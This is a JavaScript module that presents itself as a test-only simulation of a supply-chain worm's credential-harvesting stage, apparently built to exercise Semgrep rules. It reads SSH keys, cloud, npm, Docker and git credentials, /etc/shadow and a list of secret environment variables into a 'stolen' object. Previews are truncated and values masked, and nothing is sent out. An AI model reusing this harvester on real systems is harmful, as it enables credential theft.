/**
 * SHAI-HULUD SIMULATION - Stage 2: Credential Harvester
 * ⚠️ TEST ONLY - Simulates credential theft patterns
 * 
 * Techniques simulated:
 * - Sensitive file path access (Semgrep: CWE-22, secrets-detection)
 * - Environment variable harvesting (common in real attacks)
 * - npm/yarn token theft (Shai-Hulud signature)
 * - SSH key theft
 * - AWS credential theft
 */

'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');

// Hardcoded sensitive paths - Semgrep: CWE-22 path-traversal
// These are the exact paths Shai-Hulud targeted
const SENSITIVE_PATHS = {
    // npm tokens - PRIMARY TARGET of real Shai-Hulud
    npm_token: path.join(os.homedir(), '.npmrc'),
    yarn_token: path.join(os.homedir(), '.yarnrc'),
    
    // SSH keys
    ssh_private: path.join(os.homedir(), '.ssh', 'id_rsa'),
    ssh_private_ed25519: path.join(os.homedir(), '.ssh', 'id_ed25519'),
    ssh_config: path.join(os.homedir(), '.ssh', 'config'),
    
    // AWS credentials - Semgrep: aws-credentials-exposure
    aws_credentials: path.join(os.homedir(), '.aws', 'credentials'),
    aws_config: path.join(os.homedir(), '.aws', 'config'),
    
    // Other common targets
    docker_config: path.join(os.homedir(), '.docker', 'config.json'),
    kube_config: path.join(os.homedir(), '.kube', 'config'),
    gcloud_creds: path.join(os.homedir(), '.config', 'gcloud', 'credentials.db'),
    
    // Git credentials
    git_credentials: path.join(os.homedir(), '.git-credentials'),
    gitconfig: path.join(os.homedir(), '.gitconfig'),
    
    // System files
    etc_passwd: '/etc/passwd',
    etc_shadow: '/etc/shadow',
    etc_hosts: '/etc/hosts'
};

// Environment variables targeted by Shai-Hulud
// Semgrep: secrets-in-env-vars
const SENSITIVE_ENV_VARS = [
    'NPM_TOKEN',
    'NPM_AUTH_TOKEN',
    'NODE_AUTH_TOKEN',
    'GITHUB_TOKEN',
    'GH_TOKEN',
    'GITLAB_TOKEN',
    'AWS_ACCESS_KEY_ID',
    'AWS_SECRET_ACCESS_KEY',
    'AWS_SESSION_TOKEN',
    'DOCKER_PASSWORD',
    'DOCKER_AUTH_TOKEN',
    'CI_JOB_TOKEN',
    'TRAVIS_TOKEN',
    'CIRCLE_TOKEN',
    'CODECOV_TOKEN',
    'SONAR_TOKEN',
    'SLACK_WEBHOOK',
    'SLACK_TOKEN',
    'DISCORD_WEBHOOK',
    'DATABASE_URL',
    'DB_PASSWORD',
    'REDIS_URL',
    'API_KEY',
    'SECRET_KEY',
    'PRIVATE_KEY'
];

/**
 * Safely read file contents
 * In real attack: no error handling, silent theft
 */
function readFile(filepath) {
    try {
        if (fs.existsSync(filepath)) {
            const stats = fs.statSync(filepath);
            // Don't read files larger than 1MB
            if (stats.size < 1024 * 1024) {
                return fs.readFileSync(filepath, 'utf8');
            }
        }
    } catch (e) {
        // Silent failure
    }
    return null;
}

/**
 * Harvest credentials from filesystem and environment
 * This is the core malicious functionality
 */
function collect() {
    const stolen = {
        timestamp: new Date().toISOString(),
        hostname: os.hostname(),
        platform: os.platform(),
        arch: os.arch(),
        username: os.userInfo().username,
        homedir: os.homedir(),
        cwd: process.cwd(),
        files: {},
        env: {}
    };
    
    // Harvest files - Semgrep: sensitive-file-access
    for (const [name, filepath] of Object.entries(SENSITIVE_PATHS)) {
        const content = readFile(filepath);
        if (content) {
            stolen.files[name] = {
                path: filepath,
                size: content.length,
                // In real attack: full content. Here: truncated for safety
                preview: content.substring(0, 100) + '...[TRUNCATED]'
            };
        }
    }
    
    // Harvest environment variables - Semgrep: env-var-secrets
    for (const varName of SENSITIVE_ENV_VARS) {
        if (process.env[varName]) {
            // In real attack: full value. Here: masked
            const value = process.env[varName];
            stolen.env[varName] = value.substring(0, 4) + '****[MASKED]';
        }
    }
    
    // Additional recon
    stolen.nodeVersion = process.version;
    stolen.npmVersion = process.env.npm_config_user_agent || 'unknown';
    stolen.pid = process.pid;
    
    console.log('[SIMULATION] Harvested', Object.keys(stolen.files).length, 'files,', 
                Object.keys(stolen.env).length, 'env vars');
    
    return stolen;
}

module.exports = {
    collect,
    SENSITIVE_PATHS,
    SENSITIVE_ENV_VARS
};
